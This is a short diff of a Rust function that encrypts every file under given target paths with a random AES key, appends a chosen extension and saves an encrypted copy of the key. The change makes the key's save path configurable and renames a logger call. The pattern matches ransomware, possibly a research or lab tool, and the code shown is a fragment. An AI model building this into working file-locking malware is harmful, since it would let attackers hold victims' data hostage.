@@ -8,7 +8,7 @@ use openssl::symm::{self};
 use crate::utils::logger::Logger;
 
 /// Encrypts files using randomomly generated AES key
-pub fn encrypt(targets: Vec<String>, logger: &Logger, extension: &str) -> Result<(), Box<dyn std::error::Error>> {
+pub fn encrypt(targets: Vec<String>, logger: &Logger, extension: &str, key_path: &str) -> Result<(), Box<dyn std::error::Error>> {
     let files = get_files(&targets)?;
 
     let (aes_key, aes_iv) = generate_aes()?;
@@ -20,7 +20,7 @@ pub fn encrypt(targets: Vec<String>, logger: &Logger, extension: &str) -> Result
         logger.log(&format!("Encrypting {}", file.display().to_string()));
         match encrypt_file(file, aes_key, aes_iv, &extension) {
             Ok(_) => count+=1,
-            Err(_) => logger.log_error(&format!("Failed to encrypt: {}", file.display().to_string())),
+            Err(_) => logger.error(&format!("Failed to encrypt: {}", file.display().to_string())),
         }
         
     }
@@ -36,7 +36,8 @@ pub fn encrypt(targets: Vec<String>, logger: &Logger, extension: &str) -> Result
 
 
     // Save the encrypted key to file
-    let encrypted_key_path = Path::new("files/encrypted_key.bin");
+    let encrypted_key_path_str = format!("{}/encrypted_key.bin", key_path);
+    let encrypted_key_path = Path::new(&encrypted_key_path_str);
     let mut file = File::create(encrypted_key_path)?;
     file.write_all(&encrypted_key)?;
     
